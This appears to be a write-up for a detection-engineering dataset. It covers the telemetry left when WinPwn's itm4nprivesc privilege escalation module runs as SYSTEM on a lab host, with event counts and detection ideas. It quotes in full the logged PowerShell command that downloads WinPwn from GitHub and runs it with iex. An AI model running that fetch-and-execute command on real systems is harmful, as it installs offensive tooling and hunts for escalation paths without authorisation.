# T1082-15: System Information Discovery — WinPwn - itm4nprivesc

## Technique Context

T1082 (System Information Discovery) covers enumeration of host-based information to inform attacker decision-making during post-exploitation. `itm4nprivesc` is a WinPwn module that consolidates privilege escalation checks drawn from various public sources — itm4n is a well-known security researcher whose work focuses specifically on Windows local privilege escalation techniques. The module automates checks for the categories of vulnerabilities and misconfigurations that itm4n has documented and weaponized.

In contrast to winPEAS (a broad enumeration sweep), `itm4nprivesc` is more targeted: it focuses specifically on privilege escalation paths rather than general system reconnaissance. The checks it runs typically include service-related vulnerabilities (weak permissions, unquoted paths, DLL hijacking), token impersonation opportunities, COM object abuse, and similar Windows privilege escalation primitives.

When an attacker has code execution but not yet SYSTEM-level privileges, running a tool like this helps identify the fastest path to full privilege. In this test, the execution already runs as SYSTEM — so the test exercises the telemetry generated by the tool's operation rather than testing whether privilege escalation succeeds.

## What This Dataset Contains

This dataset captures the full execution of WinPwn's `itm4nprivesc` function on ACME-WS06.acme.local with Defender disabled. The execution runs as `NT AUTHORITY\SYSTEM`.

The Security log (EID 4688) and Sysmon (EID 1) record the PowerShell invocation:

```
"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput}
```

The Security channel contains 62 EID 4688 events — the highest process creation count in the T1082 WinPwn series. This is significant: `itm4nprivesc` spawns more child processes during its enumeration than the other modules. This is because itm4n's privilege escalation checks involve querying service binaries, checking file system permissions, and enumerating registry keys through helper processes, resulting in a larger process creation footprint.

The non-mscorsvw Security EID 4688 events show:
- `whoami.exe` (pre-execution identity check)
- `powershell.exe` with the full itm4nprivesc WinPwn invocation

The majority of the 62 EID 4688 events are `mscorsvw.exe` instances from .NET NGen compilation triggered by loading WinPwn and its dependencies.

The Sysmon channel (85 events) breaks down as: 67 EID 11 (file creates), 10 EID 7 (image loads), 3 EID 1 (process creates), 3 EID 10 (process access), 1 EID 17 (named pipe), and 1 EID 22 (DNS). The high EID 11 count (67 file creates) is notable — this is the highest file creation count in the T1082 series, indicating that `itm4nprivesc` either writes tool output or interim files, or that the .NET compilation triggered by loading its dependencies is particularly active.

The PowerShell channel (110 events: 108 EID 4104, 1 EID 4103, 1 EID 4100) includes the EID 4100 error event indicating a runtime error during itm4nprivesc execution — the same pattern seen in T1082-14 (winPEAS).

Compared to the defended dataset (29 sysmon, 12 security, 51 PowerShell events), the undefended capture shows dramatically more activity: 85 sysmon events (vs. 29) and 62 security events (vs. 12). The 5x increase in Security log volume and nearly 3x increase in Sysmon events represents the full execution path that Defender's interference suppressed in the defended variant.

## What This Dataset Does Not Contain

The actual privilege escalation vulnerability findings from `itm4nprivesc` — the list of exploitable service paths, weak permissions, or token opportunities on this specific endpoint — are output to console only and not captured in Windows event telemetry.

The specific child processes spawned by `itm4nprivesc` during service binary permission checks, registry enumeration, and DLL hijacking analysis are represented in the EID 4688 event count (62 events) but the full command lines for most of these processes are the NGen worker processes rather than the actual enumeration processes. The 20-event sample may not have captured all distinct process invocations made by the tool.

No outbound network connections from the `itm4nprivesc` module itself are expected — it operates locally. The initial WinPwn download connection is the only network activity associated with this test.

## Assessment

The elevated Security EID 4688 count (62 events) is the distinguishing characteristic of this dataset within the T1082 WinPwn series. `itm4nprivesc` generates more process creation activity than winPEAS (6 EID 4688), oldchecks/Powersploits (16), or the general check modules. This is consistent with itm4n's approach: many of his privilege escalation checks involve spawning helper processes to enumerate permissions, rather than running everything through PowerShell cmdlets.

The large Sysmon EID 11 count (67 file creates) further differentiates this module — the combination of many process creations and many file writes suggests the tool is actively probing the file system for permission misconfigurations, consistent with techniques like unquoted service path discovery and DLL hijacking opportunity identification.

The dataset is useful as a baseline for understanding what automated privilege escalation enumeration looks like in telemetry when it runs without interruption. The primary challenge for detection is that many of the tool's subprocess invocations are for legitimate Windows utilities querying service and permission state — the anomaly is in the volume, speed, and SYSTEM execution context, not in any single subprocess being inherently malicious.

## Detection Opportunities Present in This Data

**Security EID 4688 volume anomaly — 62 process creation events in a short window:** The sheer number of EID 4688 events generated during this test (vs. typical workstation activity) is an anomaly indicator. When 62 process creation events occur within a 2-minute window from a SYSTEM-level PowerShell process, it warrants investigation regardless of whether individual processes are recognizable.

**Security EID 4688 — itm4nprivesc WinPwn invocation:** The process creation event for `powershell.exe` with `itm4nprivesc -noninteractive -consoleoutput` and the WinPwn GitHub URL in the command line is a direct indicator of known offensive tool use.

**Sysmon EID 11 — 67 file creation events:** A large volume of file system writes associated with a PowerShell SYSTEM session suggests either tool output being written or active file permission probing. Combined with the process creation volume, this forms a high-activity cluster worth investigating.

**PowerShell EID 4100 — Execution error during itm4nprivesc run:** An error event during offensive tool execution may indicate the tool encountered a check that failed or a restricted resource it could not access. These errors can provide insight into what the tool was attempting.

**Pattern across T1082 WinPwn tests — Consistent WinPwn infrastructure:** All T1082 WinPwn tests share the same `iex(downloadstring(...))` pattern, the same GitHub URL (with pinned commit hash), the same `NT AUTHORITY\SYSTEM` execution context, and the same WMI subscription behavior. If you observe this pattern in one test, the others in the same execution campaign will have the same infrastructure fingerprint.

**Sysmon EID 22 — DNS resolution to raw.githubusercontent.com:** Present in the EID breakdown (1 event), this confirms WinPwn downloaded its payload from GitHub's CDN before execution.
